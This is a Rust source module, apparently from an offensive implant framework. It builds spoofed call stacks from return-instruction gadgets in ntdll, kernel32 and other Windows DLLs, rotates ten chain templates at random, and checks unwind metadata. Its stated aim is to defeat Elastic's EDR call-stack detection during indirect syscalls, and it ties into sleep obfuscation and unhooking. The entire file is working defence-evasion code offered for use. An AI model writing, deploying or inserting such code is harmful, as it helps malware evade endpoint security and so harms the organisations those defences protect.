//! Unwind-aware call-stack spoofing database and chain generator.
//!
//! Elastic Security (June 2025) detects synthetic call stacks by:
//!   (1) verifying stack-frame consistency during ETW callback processing,
//!   (2) detecting return addresses that don't correspond to loaded-module
//!       function entry points, and
//!   (3) identifying return addresses in the middle of instructions.
//!
//! This module counters all three checks:
//!
//! - **Address database**: At startup, we scan the export tables of common
//!   DLLs (ntdll, kernel32, kernelbase, user32, etc.) and collect every
//!   function entry point.  These are stored per-module as a sorted
//!   `Vec<usize>`, giving us valid return addresses that pass Elastic's
//!   "does this return address correspond to a function entry?" check.
//!
//! - **Unwind metadata**: Before using a return address, we verify it has a
//!   valid `RUNTIME_FUNCTION` entry via `RtlLookupFunctionEntry`.  Only
//!   addresses with valid unwind data are used, ensuring EDR stack walkers
//!   can traverse the synthetic frames without hitting garbage.
//!
//! - **Dynamic chains**: Each `do_syscall` invocation randomly selects a
//!   chain template from a pool of pre-built plausible call graphs (e.g.
//!   kernelbase!CreateProcessW → kernel32!CreateProcessA →
//!   ntdll!NtCreateUserProcess).  At least 5 templates are rotated through,
//!   preventing EDR fingerprinting of consistent call stacks.
//!
//! - **Shadow-stack compatibility**: On CET systems, the kernel verifies
//!   return addresses against the shadow stack on `ret`.  Our spoofed frames
//!   are placed *between* the NtContinue return and the target syscall gadget
//!   (above the gadget's return address on the stack) — they never cross the
//!   `syscall; ret` boundary.
//!
//! Gated behind the `stack-spoof` feature flag.

#![cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]

use std::collections::HashMap;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Mutex, OnceLock};

// ── Module name constants ───────────────────────────────────────────────────

/// DLLs to scan for export entry points.  Each entry is null-terminated so
/// it can be passed directly to `hash_str`.
const SCAN_MODULES: &[&str] = &[
    "ntdll.dll\0",
    "kernel32.dll\0",
    "kernelbase.dll\0",
    "user32.dll\0",
    "msvcrt.dll\0",
    "ucrtbase.dll\0",
];

// ── Database ────────────────────────────────────────────────────────────────

/// Cached resolved chains, pre-built at first access.  Avoids per-dispatch
/// resolution cost and allows spot-check revalidation.
static CHAIN_CACHE: OnceLock<Mutex<Vec<ResolvedChain>>> = OnceLock::new();

/// Global address database: module name → sorted list of function entry points.
/// Used for revalidation and future lookups.
static ADDR_DB: OnceLock<Mutex<HashMap<String, Vec<usize>>>> = OnceLock::new();

/// Pseudo-random seed for chain selection.  Incremented on each invocation
/// of `select_chain`.  We use a simple xorshift64 to avoid pulling in a
/// full PRNG crate; the quality requirements are minimal (just uniform-ish
/// distribution across chain templates).
static CHAIN_INDEX: AtomicU64 = AtomicU64::new(0);

// ── Chain templates ─────────────────────────────────────────────────────────
//
// Each template is a list of (module_name, function_name) pairs representing
// a plausible call graph that terminates at an NT syscall.  The last entry
// in each template is the "bottom" of the call chain (closest to the syscall
// gadget).  At dispatch time we resolve names to addresses, verify unwind
// metadata, and build the actual stack frame chain.
//
// The first entry (index 0) in each template is the "top" of the call chain —
// the outermost Win32 API call.  The last entry is the innermost ntdll syscall
// stub.  On the stack, they are pushed bottom-first so the topmost frame is
// at the lowest address.
//
// Each function name is resolved to its entry point, then scanned for a
// `ret` (0xC3) gadget within the function body.  This `ret` gadget becomes
// the actual return address that the CPU will jump to — it has valid unwind
// metadata (because it's inside a real function) and the CPU simply executes
// `ret` to pop the next frame.

type ChainTemplate = &'static [(&'static str, &'static str)];

/// Pool of chain templates.  ≥5 required by specification; we provide 10
/// for better diversity.
const CHAIN_TEMPLATES: &[ChainTemplate] = &[
    // Template 0: CreateProcessW call path
    &[
        ("kernelbase.dll\0", "CreateProcessW\0"),
        ("kernel32.dll\0", "CreateProcessA\0"),
        ("ntdll.dll\0", "NtCreateUserProcess\0"),
    ],
    // Template 1: VirtualAlloc call path
    &[
        ("kernelbase.dll\0", "VirtualAlloc\0"),
        ("kernel32.dll\0", "VirtualAllocEx\0"),
        ("ntdll.dll\0", "NtAllocateVirtualMemory\0"),
    ],
    // Template 2: WriteFile call path
    &[
        ("kernelbase.dll\0", "WriteFile\0"),
        ("kernel32.dll\0", "WriteFile\0"),
        ("ntdll.dll\0", "NtWriteFile\0"),
    ],
    // Template 3: ReadFile call path
    &[
        ("kernelbase.dll\0", "ReadFile\0"),
        ("kernel32.dll\0", "ReadFile\0"),
        ("ntdll.dll\0", "NtReadFile\0"),
    ],
    // Template 4: CreateFile call path
    &[
        ("kernelbase.dll\0", "CreateFileW\0"),
        ("kernel32.dll\0", "CreateFileA\0"),
        ("ntdll.dll\0", "NtCreateFile\0"),
    ],
    // Template 5: OpenProcess call path
    &[
        ("kernelbase.dll\0", "OpenProcess\0"),
        ("kernel32.dll\0", "OpenProcess\0"),
        ("ntdll.dll\0", "NtOpenProcess\0"),
    ],
    // Template 6: WaitForSingleObject call path
    &[
        ("kernelbase.dll\0", "WaitForSingleObject\0"),
        ("kernel32.dll\0", "WaitForSingleObject\0"),
        ("ntdll.dll\0", "NtWaitForSingleObject\0"),
    ],
    // Template 7: DeviceIoControl call path
    &[
        ("kernelbase.dll\0", "DeviceIoControl\0"),
        ("kernel32.dll\0", "DeviceIoControl\0"),
        ("ntdll.dll\0", "NtDeviceIoControlFile\0"),
    ],
    // Template 8: OpenThread call path
    &[
        ("kernelbase.dll\0", "OpenThread\0"),
        ("kernel32.dll\0", "OpenThread\0"),
        ("ntdll.dll\0", "NtOpenThread\0"),
    ],
    // Template 9: MapViewOfFile call path
    &[
        ("kernelbase.dll\0", "MapViewOfFile\0"),
        ("kernel32.dll\0", "MapViewOfFile\0"),
        ("ntdll.dll\0", "NtMapViewOfSection\0"),
    ],
];

// ── Resolved chain frame ────────────────────────────────────────────────────

/// A single frame in a resolved call chain.  `return_addr` is the address
/// that will be pushed onto the stack as the return site for the frame above.
#[derive(Clone, Copy, Debug)]
pub struct ChainFrame {
    /// The return address for this frame — a verified `ret` gadget address
    /// within a loaded-module function.  The CPU will execute `ret` at this
    /// address, popping the next frame's address from the stack.
    pub return_addr: usize,
}

/// A fully resolved call chain ready to be pushed onto the stack.
#[derive(Clone, Debug)]
pub struct ResolvedChain {
    /// Frames from bottom (closest to the syscall gadget) to top (farthest).
    /// When pushed onto the stack, index 0 is at the lowest address.
    ///
    /// Execution trace after NtContinue restores CONTEXT:
    ///   1. CPU at gadget_addr → `syscall; ret` → pops frames[0]
    ///   2. frames[0] is a `ret` gadget → `ret` → pops frames[1]
    ///   3. ... repeat until frames[N-1]'s `ret` pops continuation addr
    ///   4. Resumes at do_syscall label with RAX = NTSTATUS
    pub frames: Vec<ChainFrame>,
}

// ── Cached RtlLookupFunctionEntry pointer ───────────────────────────────────

/// Lazily-resolved pointer to `RtlLookupFunctionEntry`.  Avoids re-resolving
/// on every call to `has_valid_unwind_info`.
static RTL_LOOKUP_FN_ENTRY: OnceLock<usize> = OnceLock::new();

/// Resolve `RtlLookupFunctionEntry` from ntdll and cache the pointer.
fn get_rtl_lookup() -> Option<usize> {
    Some(*RTL_LOOKUP_FN_ENTRY.get_or_init(|| unsafe {
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
        let hash = pe_resolve::hash_str(b"RtlLookupFunctionEntry\0");
        pe_resolve::get_proc_address_by_hash(ntdll_base, hash)
    }))
}

// ── Unwind metadata validation ──────────────────────────────────────────────

/// Check whether `addr` has a valid `RUNTIME_FUNCTION` entry.
///
/// On x64 Windows, the `RUNTIME_FUNCTION` table maps code ranges to unwind
/// information.  `RtlLookupFunctionEntry` searches this table.  If it returns
/// a non-null entry, the address has valid unwind data that EDR stack walkers
/// can use to traverse the frame.
///
/// # Safety
///
/// Calls `RtlLookupFunctionEntry` which reads the RUNTIME_FUNCTION table.
unsafe fn has_valid_unwind_info(addr: usize) -> bool {
    let fn_addr = match get_rtl_lookup() {
        Some(a) if a != 0 => a,
        _ => return false,
    };

    // PRUNTIME_FUNCTION RtlLookupFunctionEntry(
    //     ULONG_PTR ControlPc,
    //     PRUNTIME_FUNCTION_TABLE Entry,    // out: table base
    //     PULONG64 TableAddress            // out: image base
    // );
    type FnLookup = unsafe extern "system" fn(usize, *mut usize, *mut u64) -> usize;
    let lookup: FnLookup = std::mem::transmute(fn_addr);

    let mut table_base: usize = 0;
    let mut image_base: u64 = 0;
    let entry_ptr = lookup(addr, &mut table_base, &mut image_base);
    entry_ptr != 0
}

// ── Database initialisation ─────────────────────────────────────────────────

/// Build the address database by scanning loaded module export tables.
///
/// For each module in `SCAN_MODULES`, walk the PE export directory and
/// collect all function entry-point virtual addresses.  Store them sorted
/// in the global `ADDR_DB`.
///
/// # Safety
///
/// Must be called with a valid process state (modules loaded, PEB walkable).
unsafe fn build_address_db() -> HashMap<String, Vec<usize>> {
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64};

    let mut db = HashMap::new();

    for &module_name in SCAN_MODULES {
        // module_name is already null-terminated (e.g. "ntdll.dll\0").
        let hash = pe_resolve::hash_str(module_name.as_bytes());
        let module_base = match pe_resolve::get_module_handle_by_hash(hash) {
            Some(b) => b,
            None => continue, // Module not loaded — skip
        };

        // Walk the PE export directory.
        let dos = &*(module_base as *const IMAGE_DOS_HEADER);
        if dos.e_magic != 0x5A4D {
            continue;
        }
        let nt = &*((module_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
        let export_rva = nt.OptionalHeader.DataDirectory[0].VirtualAddress as usize;
        let export_size = nt.OptionalHeader.DataDirectory[0].Size as usize;
        if export_rva == 0 || export_size == 0 {
            continue;
        }

        let dir = &*((module_base + export_rva) as *const IMAGE_EXPORT_DIRECTORY);
        let n_names = dir.NumberOfNames as usize;
        if n_names == 0 {
            continue;
        }

        let name_rvas = std::slice::from_raw_parts(
            (module_base + dir.AddressOfNames as usize) as *const u32,
            n_names,
        );
        let ordinals = std::slice::from_raw_parts(
            (module_base + dir.AddressOfNameOrdinals as usize) as *const u16,
            n_names,
        );
        let func_rvas = std::slice::from_raw_parts(
            (module_base + dir.AddressOfFunctions as usize) as *const u32,
            dir.NumberOfFunctions as usize,
        );

        let mut entry_points = Vec::with_capacity(n_names);
        for i in 0..n_names {
            let ord = ordinals[i] as usize;
            if ord >= func_rvas.len() {
                continue;
            }
            let func_rva = func_rvas[ord] as usize;
            // Skip forwarded exports.
            if func_rva >= export_rva && func_rva < export_rva + export_size {
                continue;
            }
            entry_points.push(module_base + func_rva);
        }

        entry_points.sort_unstable();
        entry_points.dedup();

        let key = module_name.trim_end_matches('\0').to_string();
        log::debug!(
            "stack_db: collected {} entry points from {}",
            entry_points.len(),
            key
        );
        db.insert(key, entry_points);
    }

    log::info!(
        "stack_db: address database built with {} modules, {} total entry points",
        db.len(),
        db.values().map(|v| v.len()).sum::<usize>()
    );
    db
}

// ── Ret gadget finder ───────────────────────────────────────────────────────

/// Find a `ret` (0xC3) gadget inside a function body.
///
/// Scans the first `scan_len` bytes of the function at `func_addr` for a
/// `ret` instruction.  Each candidate is validated against
/// `RtlLookupFunctionEntry` to ensure the stack walker can traverse it.
///
/// Returns the address of the `ret` gadget, or `None` if none found.
///
/// # Safety
///
/// Reads from `func_addr`; must point to readable executable memory.
unsafe fn find_ret_gadget(func_addr: usize, scan_len: usize) -> Option<usize> {
    let probe = std::slice::from_raw_parts(func_addr as *const u8, scan_len);
    for (i, &byte) in probe.iter().enumerate() {
        if byte == 0xC3 {
            let gadget_addr = func_addr + i;
            if has_valid_unwind_info(gadget_addr) {
                return Some(gadget_addr);
            }
            // 0xC3 found but no valid unwind — keep scanning.
        }
    }
    None
}

// ── Chain resolution ────────────────────────────────────────────────────────

/// Resolve a single (module, function) pair to a `ret` gadget address.
///
/// Looks up the named function in the named module, then scans it for a
/// `ret` (0xC3) gadget with valid unwind metadata.  Returns the gadget
/// address (not the function entry point).
///
/// Returns `None` if the module is not loaded, the function is not exported,
/// no `ret` gadget is found, or the gadget lacks valid unwind information.
unsafe fn resolve_ret_gadget(module_name: &str, function_name: &str) -> Option<usize> {
    // Both module_name and function_name are null-terminated in our templates.
    let mod_hash = pe_resolve::hash_str(module_name.as_bytes());
    let base = pe_resolve::get_module_handle_by_hash(mod_hash)?;

    let fn_hash = pe_resolve::hash_str(function_name.as_bytes());
    let func_addr = pe_resolve::get_proc_address_by_hash(base, fn_hash)?;

    // Scan the first 128 bytes for a `ret` gadget.
    find_ret_gadget(func_addr, 128)
}

/// Pre-resolve all chain templates at startup.
///
/// Iterates through `CHAIN_TEMPLATES`, attempts to resolve each one to a
/// chain of `ret` gadgets, and returns a `Vec` of successfully resolved
/// chains.  Only chains where every template entry resolved are included.
unsafe fn resolve_all_templates() -> Vec<ResolvedChain> {
    let mut chains = Vec::new();

    for (idx, template) in CHAIN_TEMPLATES.iter().enumerate() {
        let mut frames = Vec::with_capacity(template.len());
        let mut all_ok = true;

        for &(module_name, function_name) in template.iter() {
            match resolve_ret_gadget(module_name, function_name) {
                Some(addr) => frames.push(ChainFrame {
                    return_addr: addr,
                }),
                None => {
                    log::debug!(
                        "stack_db: template {} — could not resolve {}!{}",
                        idx,
                        module_name.trim_end_matches('\0'),
                        function_name.trim_end_matches('\0'),
                    );
                    all_ok = false;
                    break;
                }
            }
        }

        if all_ok && !frames.is_empty() {
            log::debug!(
                "stack_db: template {} resolved with {} frames",
                idx,
                frames.len()
            );
            chains.push(ResolvedChain { frames });
        }
    }

    log::info!(
        "stack_db: resolved {}/{} chain templates",
        chains.len(),
        CHAIN_TEMPLATES.len()
    );
    chains
}

/// Ensure the chain cache and address database are initialised.
///
/// Called on first access; subsequent calls are a no-op.
fn ensure_initialised() {
    ADDR_DB.get_or_init(|| Mutex::new(unsafe { build_address_db() }));
    CHAIN_CACHE.get_or_init(|| Mutex::new(unsafe { resolve_all_templates() }));
}

/// Simple xorshift64 PRNG for chain index selection.
fn xorshift64(state: u64) -> u64 {
    let mut s = state;
    if s == 0 {
        s = 0xDEAD_BEEF_CAFE_BABEu64; // Avoid zero state.
    }
    s ^= s << 13;
    s ^= s >> 7;
    s ^= s << 17;
    s
}

/// Select a random chain template index.
fn next_chain_index(n: usize) -> usize {
    let old = CHAIN_INDEX.fetch_add(1, Ordering::Relaxed);
    let seed = old.wrapping_add(
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos() as u64,
    );
    let rng = xorshift64(seed);
    (rng as usize) % n
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Build a resolved call chain by selecting a random pre-resolved template.
///
/// Returns `None` if no templates could be resolved (fallback to the old
/// single-frame NtQuerySystemTime spoof).
pub fn build_chain() -> Option<ResolvedChain> {
    ensure_initialised();

    let cache = CHAIN_CACHE.get().unwrap();
    let guard = cache.lock().unwrap();
    if guard.is_empty() {
        log::debug!("stack_db: no resolved chains available");
        return None;
    }

    let idx = next_chain_index(guard.len());
    let chain = guard[idx].clone();
    log::trace!("stack_db: selected cached chain {} ({} frames)", idx, chain.frames.len());
    Some(chain)
}

/// Build a legacy single-frame chain using the old NtQuerySystemTime approach.
///
/// Scans NtQuerySystemTime for a `ret` (0xC3) instruction and returns it as
/// a single-frame chain.  This is the fallback when the address database is
/// empty or no multi-frame template resolves successfully.
pub fn build_legacy_chain() -> Option<ResolvedChain> {
    unsafe {
        let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
            Some(b) => b,
            None => return None,
        };
        let func_addr = match pe_resolve::get_proc_address_by_hash(
            ntdll,
            pe_resolve::hash_str(b"NtQuerySystemTime\0"),
        ) {
            Some(a) => a,
            None => return None,
        };
        // Scan for a `ret` (0xC3) within the first 64 bytes.
        let probe = std::slice::from_raw_parts(func_addr as *const u8, 64);
        for (i, &byte) in probe.iter().enumerate() {
            if byte == 0xC3 {
                let addr = func_addr + i;
                // Validate unwind metadata for consistency.
                if has_valid_unwind_info(addr) {
                    return Some(ResolvedChain {
                        frames: vec![ChainFrame { return_addr: addr }],
                    });
                }
                // Unwind check failed — continue scanning for a valid ret gadget.
            }
        }
        None
    }
}

// ── Stack frame layout helpers ──────────────────────────────────────────────

/// Calculate the number of u64 slots needed for the spoofed chain frame buffer.
///
/// The layout on the stack (growing downward) for N-chain-frames is:
///
/// ```text
///   RSP →  [chain_frame_0]      ← bottom frame (closest to syscall gadget)
///          [chain_frame_1]
///          ...
///          [chain_frame_N-1]     ← top frame (farthest from gadget)
///          [continuation]        ← real return to do_syscall
///          [shadow home rcx]     (zeroed; not read by kernel for syscalls)
///          [shadow home rdx]     (zeroed)
///          [shadow home r8]      (zeroed)
///          [shadow home r9]      (zeroed)
///          [arg 5, arg 6, ...]
/// ```
///
/// Total slots: n_chain_frames + 1 (continuation) + 4 (shadow) + n_stack_args
///
/// NOTE: In the NtContinue path, the shadow home slot for rcx [0] is
/// repurposed as the continuation address — identical to the existing
/// single-frame design.  So the actual total is:
///
///   n_chain_frames + 1 (continuation, in shadow[0]) + 3 (shadow[1..3]) + n_stack_args
///
/// For simplicity and compatibility, we keep the full 4 shadow slots in the
/// buffer and let the caller decide how to use them.
///
/// # Arguments
///
/// * `n_chain_frames` — Number of spoofed frames in the chain
/// * `n_stack_args` — Number of stack-passed syscall arguments (args[4..])
pub fn frame_buffer_slots(n_chain_frames: usize, n_stack_args: usize) -> usize {
    n_chain_frames + 1 + 4 + n_stack_args
}

/// Populate a spoof frame buffer for the NtContinue-based dispatch path.
///
/// Writes the chain frames, continuation slot, shadow space, and stack
/// arguments into `buf`.  Returns the index of the continuation slot so
/// the asm block can write the actual return address.
///
/// # Stack layout (indices into `buf`)
///
/// ```text
///   [0]       = chain_frame[0].return_addr  (bottom — popped by gadget ret)
///   [1]       = chain_frame[1].return_addr  (popped by frame[0]'s ret)
///   ...
///   [N-1]     = chain_frame[N-1].return_addr (top — popped by frame[N-2]'s ret)
///   [N]       = continuation                 (filled by asm: lea r15, [rip+2f])
///   [N+1..N+3] = shadow home [1..3]          (zeroed)
///   [N+4..]  = stack arguments               (args[4..])
/// ```
///
/// Execution trace after NtContinue restores the CONTEXT:
///   - CPU executes `syscall; ret` at gadget → pops [0] = chain_frame[0]
///   - chain_frame[0] is a `ret` gadget → `ret` pops [1] = chain_frame[1]
///   - ... repeat until chain_frame[N-1]'s `ret` pops [N] = continuation
///   - Resumes at do_syscall label with RAX = target NTSTATUS
///
/// # Returns
///
/// The index of the continuation slot (so the asm block can write to it).
pub fn populate_frame_buffer(
    buf: &mut [u64],
    chain: &ResolvedChain,
    stack_args: &[u64],
) -> usize {
    let n_frames = chain.frames.len();
    let cont_idx = n_frames;

    // Write chain frame return addresses (bottom frame first).
    for (i, frame) in chain.frames.iter().enumerate() {
        buf[i] = frame.return_addr as u64;
    }

    // Continuation slot [cont_idx] — filled by asm.
    buf[cont_idx] = 0;

    // Shadow home [cont_idx+1 .. cont_idx+3] — zeroed.
    for i in 1..=3 {
        buf[cont_idx + i] = 0;
    }

    // Stack arguments.
    for (i, &arg) in stack_args.iter().enumerate() {
        buf[cont_idx + 4 + i] = arg;
    }

    cont_idx
}

// ── Re-validation ───────────────────────────────────────────────────────────

/// Check whether `addr` points into committed executable memory.
fn is_executable_address(addr: usize) -> bool {
    use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, MEM_COMMIT};

    unsafe {
        let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
        let mut return_len: usize = 0;
        let status = syscall!(
            "NtQueryVirtualMemory",
            -1i64 as u64,                                      // NtCurrentProcess()
            addr as u64,                                       // BaseAddress
            0u64,                                              // MemoryBasicInformation
            &mut mbi as *mut _ as u64,                         // Buffer
            std::mem::size_of::<MEMORY_BASIC_INFORMATION>() as u64, // Length
            &mut return_len as *mut _ as u64,                  // ReturnLength
        );
        if status.is_err() || status.unwrap() < 0 {
            return false;
        }
        if mbi.State != MEM_COMMIT {
            return false;
        }
        const PAGE_EXECUTE: u32 = 0x10;
        const PAGE_EXECUTE_READ: u32 = 0x20;
        const PAGE_EXECUTE_READWRITE: u32 = 0x40;
        const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
        let prot = mbi.Protect;
        prot == PAGE_EXECUTE
            || prot == PAGE_EXECUTE_READ
            || prot == PAGE_EXECUTE_READWRITE
            || prot == PAGE_EXECUTE_WRITECOPY
    }
}

/// Re-validate the address database after sleep obfuscation decrypts memory.
///
/// Modules can be rebased (e.g., by EDR unhooking tools that unload/reload
/// DLLs).  Check whether any cached chain address is still in a valid
/// committed executable region.  If any address is invalid, rebuild the
/// entire database and chain cache.
///
/// This should be called from sleep obfuscation's post-wake step, after
/// decryption but before the next syscall.
pub fn revalidate_db() {
    ensure_initialised();

    // Spot-check the cached chains.
    let cache = CHAIN_CACHE.get().unwrap();
    let guard = cache.lock().unwrap();
    let mut any_invalid = false;

    for (ci, chain) in guard.iter().enumerate() {
        // Check the first frame of each chain (it's a `ret` gadget in ntdll,
        // which is the most likely to be affected by unhooking).
        if let Some(first) = chain.frames.first() {
            if !is_executable_address(first.return_addr) {
                log::warn!(
                    "stack_db: chain {} frame 0 addr {:#x} invalid — triggering rebuild",
                    ci,
                    first.return_addr
                );
                any_invalid = true;
                break;
            }
        }
    }
    drop(guard);

    if any_invalid {
        rebuild_db();
    }
}

/// Force-rebuild the address database and chain cache.
pub fn rebuild_db() {
    log::info!("stack_db: rebuilding address database and chain cache");

    // Rebuild address database.
    if let Some(db) = ADDR_DB.get() {
        let new_db = unsafe { build_address_db() };
        let mut guard = db.lock().unwrap();
        *guard = new_db;
    }

    // Rebuild chain cache.
    if let Some(cache) = CHAIN_CACHE.get() {
        let new_chains = unsafe { resolve_all_templates() };
        let mut guard = cache.lock().unwrap();
        *guard = new_chains;
    }

    log::info!("stack_db: rebuild complete");
}

/// Return the total number of entry points across all modules.
pub fn entry_count() -> usize {
    ensure_initialised();
    let db = ADDR_DB.get().unwrap();
    let guard = db.lock().unwrap();
    guard.values().map(|v| v.len()).sum()
}

/// Return whether the chain cache has resolved chains available.
pub fn is_available() -> bool {
    ensure_initialised();
    let cache = CHAIN_CACHE.get().unwrap();
    let guard = cache.lock().unwrap();
    !guard.is_empty()
}
